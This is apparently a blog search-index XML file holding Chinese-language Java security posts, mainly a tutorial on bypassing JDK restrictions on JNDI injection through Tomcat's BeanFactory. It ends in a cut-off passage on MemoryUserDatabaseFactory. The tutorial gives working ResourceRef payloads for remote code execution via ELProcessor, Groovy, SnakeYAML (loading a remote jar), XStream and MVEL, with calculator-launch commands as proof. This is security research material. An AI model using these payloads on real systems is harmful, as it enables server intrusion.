<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SpringBoot Fatjar从任意文件写到RCE</title>
    <link href="/2023/06/08/SpringBoot%20Fatjar%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E7%A8%B3%E5%AE%9ARCE/"/>
    <url>/2023/06/08/SpringBoot%20Fatjar%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%88%B0%E7%A8%B3%E5%AE%9ARCE/</url>
    
    <content type="html"><![CDATA[<p>SpringBoot Fatjar从任意文件写到RCE</p><h1 id="REF"><a href="#REF" class="headerlink" title="REF"></a>REF</h1><p><a href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/</a></p><p><a href="https://landgrey.me/blog/22/">LandGrey’s Blog</a></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java任意文件写到RCE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI Attack 高版本bypass</title>
    <link href="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/"/>
    <url>/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><p>以下JDK版本之后出现了针对<code>trustURLCodebase</code>的限制，即默认不允许加载远程ObjectFactory：</p><ul><li>RMI：6u132, 7u122, 8u113</li><li>LDAP：11.0.1, 8u191, 7u201, 6u211</li></ul><h2 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h2><p>绕过思路主要就是触发JDNI注入的过程中会触发受害机<code>ObjectFactory</code>实现类的<code>getObjectInstance()</code>方法，既然高版本不适用加载远程<code>ObjectFactory</code>，那么就是用本地<code>ObjectFactory</code>，常用的绕过有：</p><ol><li><strong>基于Tomcat依赖中的<code>BeanFactory</code>。</strong>⭐⭐</li><li><strong>基于Tomcat中的<code>MemoryUserDatabaseFactory</code>。</strong></li><li><strong>基于JDBC-RCE。</strong></li><li><strong>基于反序列化。</strong></li></ol><h1 id="利用BeanFactory"><a href="#利用BeanFactory" class="headerlink" title="利用BeanFactory"></a>利用BeanFactory</h1><p>简单看一下BeanFactory#getObjectInstance()的处理过程，首先获取Reference类名(必须是ResourceRef)并load类，如果上下文中没有ClassLoader就用SystemClassLoader。</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100607955.png" class="" title="image-20230706100607955"><p>下一步使用java.beans.Introspector对beanclass进行解析，获取bean中的所有属性，然后拿Reference类的forceString，并对其value以<code> ,</code>进行split。</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706100903221.png" class="" title="image-20230706100903221"><p>然后遍历split出来的hashmap，获取其setter方法</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706102127965.png" class="" title="image-20230706102127965"><p>最后直接反射调用setter方法</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230706102259825.png" class="" title="image-20230706102259825"><p>处理逻辑其实是：</p><ol><li>取出forceString的值，按照<code>,</code>分割为不同的method，<code>=</code>分割为param与propName。</li><li>将propName作为方法名反射获得一个参数为String.class的方法。</li><li>取出Addrs中param的值，并作为参数赋予propName方法执行。</li></ol><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.example.Demo&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;&lt;param&gt;=&lt;propName&gt;&quot;</span>)); <span class="hljs-comment">//参数 = 方法</span><br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;&lt;param&gt;&quot;</span>, <span class="hljs-string">&quot;paramValue&quot;</span>));<br><span class="hljs-keyword">return</span> ref;<br><span class="hljs-comment">//等同于 new org.example.Demo().propName(&quot;paramValue&quot;)</span><br></code></pre></td></tr></table></figure><p>所以总结出来可利用类的要求就是</p><ul><li>类必须在本地依赖或者JDK自带。</li><li>可以调用的是public无参构造方法，并且参数只能有一个String。</li></ul><p>顺着这个思路在常用的依赖中查找，有以下几个可利用的地方：</p><ul><li>javax.el.<strong>ELProcessor</strong>#eval()</li><li>groovy.lang.<strong>GroovyShell</strong>#evaluate() &#x2F; (<strong>GroovyClassLoader</strong>)</li><li>org.yaml.snakeyaml.<strong>Yaml</strong>#load()</li><li>com.thoughtworks.xstream.<strong>XStream</strong>#fromXML()</li><li>org.mvel2**.MVEL**#eval()</li><li>com.sun.glass.utils.<strong>NativeLibLoader</strong>#()</li></ul><h2 id="javax-el-ELProcessor-eval-RCE"><a href="#javax-el-ELProcessor-eval-RCE" class="headerlink" title="javax.el.ELProcessor#eval() [RCE]"></a>javax.el.<strong>ELProcessor</strong>#eval() [RCE]</h2><p>执行EL表达式RCE</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br><br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;</span>));<br><span class="hljs-keyword">return</span> ref;<br><br><span class="hljs-comment">//等同于</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">new javax.el.ELProcessor().eval(&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;]).start()\&quot;)&quot;)</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><h2 id="groovy-lang-GroovyClassLoader-evaluate-RCE"><a href="#groovy-lang-GroovyClassLoader-evaluate-RCE" class="headerlink" title="groovy.lang.GroovyClassLoader#evaluate() [RCE]"></a>groovy.lang.<strong>GroovyClassLoader</strong>#evaluate() [RCE]</h2><p>顾名思义，利用groovy依赖自定义类加载。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">        <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;groovy.lang.GroovyClassLoader&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;gungnir=parseClass&quot;</span>));<br>        <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">&quot;@groovy.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef gungnir\n&quot;</span>, <span class="hljs-string">&quot;calc.exe&quot;</span>);<br>        resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;gungnir&quot;</span>,script));<br><span class="hljs-comment">//等同于</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">new groovy.lang.GroovyClassLoader().parseClass(&quot;<span class="hljs-doctag">@groovy</span>.transform.ASTTest(value=&#123;\nassert java.lang.Runtime.getRuntime().exec(\&quot;%s\&quot;)\n&#125;)\ndef gungnir\n&quot;, &quot;calc.exe&quot;)</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><p>当然也可以直接GroovyShell执行。</p><h2 id="org-yaml-snakeyaml-Yaml-load-RCE"><a href="#org-yaml-snakeyaml-Yaml-load-RCE" class="headerlink" title="org.yaml.snakeyaml.Yaml#load() [RCE]"></a>org.yaml.snakeyaml.<strong>Yaml</strong>#load() [RCE]</h2><p>加载解析yaml字符串，实现类方法的调用，例如URLCLassLoader。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.yaml.snakeyaml.Yaml&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">yaml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;!!javax.script.ScriptEngineManager [\n&quot;</span> +<br>        <span class="hljs-string">&quot;  !!java.net.URLClassLoader [[\n&quot;</span> +<br>        <span class="hljs-string">&quot;    !!java.net.URL [\&quot;http://127.0.0.1:8888/exp.jar\&quot;]\n&quot;</span> +<br>        <span class="hljs-string">&quot;  ]]\n&quot;</span> +<br>        <span class="hljs-string">&quot;]&quot;</span>;<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=load&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, yaml));<br><span class="hljs-keyword">return</span> ref;<br></code></pre></td></tr></table></figure><h2 id="com-thoughtworks-xstream-XStream-fromXML-RCE"><a href="#com-thoughtworks-xstream-XStream-fromXML-RCE" class="headerlink" title="com.thoughtworks.xstream.XStream#fromXML() [RCE]"></a>com.thoughtworks.xstream.<strong>XStream</strong>#fromXML() [RCE]</h2><p>XML反序列化打本地反序列化链。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;com.thoughtworks.xstream.XStream&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">xml</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &lt;unserializable-parents/&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &lt;java.util.PriorityQueue&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;default&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;size&gt;2&lt;/size&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;/default&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;int&gt;3&lt;/int&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;dynamic-proxy&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;handler class=&#x27;sun.tracing.NullProvider&#x27;&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;active&gt;true&lt;/active&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;providerType&gt;java.lang.Comparable&lt;/providerType&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;probes&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;          &lt;entry&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;class&gt;java.lang.Comparable&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;name&gt;compareTo&lt;/name&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;class&gt;java.lang.Object&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;/parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;/method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;proxy class=&#x27;java.lang.Runtime&#x27;/&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;implementing__method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;class&gt;java.lang.Runtime&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;name&gt;exec&lt;/name&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                  &lt;class&gt;java.lang.String&lt;/class&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;                &lt;/parameter-types&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;              &lt;/implementing__method&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;            &lt;/sun.tracing.dtrace.DTraceProbe&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;          &lt;/entry&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;        &lt;/probes&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;      &lt;/handler&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;/dynamic-proxy&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;    &lt;string&gt;/System/Applications/Calculator.app/Contents/MacOS/Calculator&lt;/string&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;  &lt;/java.util.PriorityQueue&gt;\n&quot;</span> +<br>            <span class="hljs-string">&quot;&lt;/java.util.PriorityQueue&gt;&quot;</span>;<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=fromXML&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, xml));<br>    <span class="hljs-keyword">return</span> ref;<br></code></pre></td></tr></table></figure><h2 id="org-mvel2-MVEL-eval-RCE"><a href="#org-mvel2-MVEL-eval-RCE" class="headerlink" title="org.mvel2**.MVEL**#eval() [RCE]"></a>org.mvel2**.MVEL**#eval() [RCE]</h2><p>通过 <code>ShellSession.exec(String)</code> 去执行push命令，从而解析MVEL表达式。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;org.mvel2.sh.ShellSession&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>        <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=exec&quot;</span>));<br>ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>,<br>        <span class="hljs-string">&quot;push Runtime.getRuntime().exec(&#x27;/System/Applications/Calculator.app/Contents/MacOS/Calculator&#x27;);&quot;</span>));<br><span class="hljs-keyword">return</span> ref;<br></code></pre></td></tr></table></figure><h2 id="javax-management-loading-MLet-类探测"><a href="#javax-management-loading-MLet-类探测" class="headerlink" title="javax.management.loading.MLet [类探测]"></a>javax.management.loading.MLet [类探测]</h2><p>只能执行到loadClass()，仅仅加载没有初始化或实例化，因此只能探测类是否存在无法直接RCE。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.management.loading.MLet&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="hljs-literal">null</span>);<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;a=loadClass,b=addURL,c=loadClass&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:2333/&quot;</span>));<br>    ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;Blue&quot;</span>));<br>    <span class="hljs-keyword">return</span> ref;<br><span class="hljs-comment">//等同于</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">MLet mLet = new MLet();</span><br><span class="hljs-comment">mLet.addURL(&quot;http://127.0.0.1:2333/&quot;);</span><br><span class="hljs-comment">mLet.loadClass(&quot;Exploit&quot;);</span><br><span class="hljs-comment">**/</span><br></code></pre></td></tr></table></figure><h2 id="com-sun-glass-utils-NativeLibLoader-外部库加载RCE"><a href="#com-sun-glass-utils-NativeLibLoader-外部库加载RCE" class="headerlink" title="com.sun.glass.utils.NativeLibLoader#() [外部库加载RCE]"></a>com.sun.glass.utils.<strong>NativeLibLoader</strong>#() [外部库加载RCE]</h2><p>参考：<a href="https://tttang.com/archive/1489%EF%BC%8C%E6%9C%89%E5%8F%AF%E7%94%A8%E7%9A%84%E4%B8%8A%E4%BC%A0%E6%8E%A5%E5%8F%A3%E6%AF%94%E8%BE%83%E6%96%B9%E4%BE%BF%EF%BC%8C%E7%A8%B3%E5%AE%9A%E5%AE%9E%E7%8E%B0%E8%BE%83%E5%A4%8D%E6%9D%82%E3%80%82">https://tttang.com/archive/1489，有可用的上传接口比较方便，稳定实现较复杂。</a></p><h1 id="利用MemoryUserDatabaseFactory"><a href="#利用MemoryUserDatabaseFactory" class="headerlink" title="利用MemoryUserDatabaseFactory"></a>利用MemoryUserDatabaseFactory</h1><p> 这个类也实现了ObjectFactory，其getObjectInstance()方法调用一系列setter对pathname、readOnly等属性赋值，然后就会调用open()方法，如果readOnly为false则调用save()进行存储。</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827114744484.png" class="" title="image-20230827114744484"><p>首先看open()方法：</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827155857948.png" class="" title="image-20230827155857948"><p>open()方法会把pathname转换为URI并发起连接请求，然后使用Digester进行XML解析。</p><img src="/2023/06/03/JNDI%20Attack%20%E9%AB%98%E7%89%88%E6%9C%ACbypass/image-20230827160143774.png" class="" title="image-20230827160143774"><p>再看save()，它则是直接打开了写入流，将XML解析出来的role、user等键值写入，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">save</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.getReadonly()) &#123;<br>            log.error(sm.getString(<span class="hljs-string">&quot;memoryUserDatabase.readOnly&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.isWriteable()) &#123;<br>            log.warn(sm.getString(<span class="hljs-string">&quot;memoryUserDatabase.notPersistable&quot;</span>));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-type">File</span> <span class="hljs-variable">fileNew</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-built_in">this</span>.pathnameNew);<br>            <span class="hljs-keyword">if</span> (!fileNew.isAbsolute()) &#123;<br>                fileNew = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(System.getProperty(<span class="hljs-string">&quot;catalina.base&quot;</span>), <span class="hljs-built_in">this</span>.pathnameNew);<br>            &#125;<br><br>            <span class="hljs-built_in">this</span>.writeLock.lock();<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(fileNew);<br>                    <span class="hljs-type">Throwable</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">OutputStreamWriter</span> <span class="hljs-variable">osw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OutputStreamWriter</span>(fos, <span class="hljs-string">&quot;UTF8&quot;</span>);<br>                        <span class="hljs-type">Throwable</span> <span class="hljs-variable">var5</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                        <span class="hljs-keyword">try</span> &#123;<br>                            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PrintWriter</span>(osw);<br>                            <span class="hljs-type">Throwable</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>                            <span class="hljs-keyword">try</span> &#123;<br>                                writer.println(<span class="hljs-string">&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;&quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;&lt;tomcat-users xmlns=\&quot;http://tomcat.apache.org/xml\&quot;&quot;</span>);<br>                                writer.print(<span class="hljs-string">&quot;              &quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;xmlns:xsi=\&quot;http://www.w3.org/2001/XMLSchema-instance\&quot;&quot;</span>);<br>                                writer.print(<span class="hljs-string">&quot;              &quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;xsi:schemaLocation=\&quot;http://tomcat.apache.org/xml tomcat-users.xsd\&quot;&quot;</span>);<br>                                writer.println(<span class="hljs-string">&quot;              version=\&quot;1.0\&quot;&gt;&quot;</span>);<br>                                Iterator&lt;?&gt; values = <span class="hljs-literal">null</span>;<br>                                values = <span class="hljs-built_in">this</span>.getRoles();<br><br>                                <span class="hljs-keyword">while</span>(values.hasNext()) 